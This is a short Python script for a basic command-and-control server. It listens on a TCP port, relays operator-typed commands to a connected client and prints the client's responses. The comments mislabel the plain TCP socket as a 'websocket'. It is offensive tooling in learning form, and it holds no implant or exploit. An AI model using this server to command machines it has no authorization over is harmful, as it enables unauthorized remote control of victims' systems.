import socket
import sys

def listener_handler():
	# bind websocket to host ip/port
	print(f'[+] C2 server bound to {host_ip} on port {host_port}. \n\n[+] Awaiting connection from client...')
	sock.bind((host_ip, host_port))
	
	# set socket to listen and accept connections from the address declared in app variables
	sock.listen()
	
	remote_target, remote_ip = sock.accept()
	# use {remote_ip[0]} to omit port from print statement
	print(f'[+] Connection received from {remote_ip}')

	# keep connection open via while loop
	while True:
		try:
			# capture and send message
			message = input('Python-C2 -> ')

			# exit message handling
			if message == 'exit':
				remote_target.send(message.encode())
				remote_target.close()
				break		

			remote_target.send(message.encode())
		
			# receive and print message
			response = remote_target.recv(1024).decode()
			if response == 'exit':
				print('[-] The client has terminated the session.')
				remote_target.close()
				break
			print(response)
		
		# Custom error/exit messages
		except KeyboardInterrupt:
			print("[~] Keyboard interrupt received.")
			remote_target.close()
			break

		except Exception:
			print("[~] Generic error message.")
			remote_target.close()
			break

# instantiate websocket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host_ip = sys.argv[1]  
host_port = int(sys.argv[2])

listener_handler()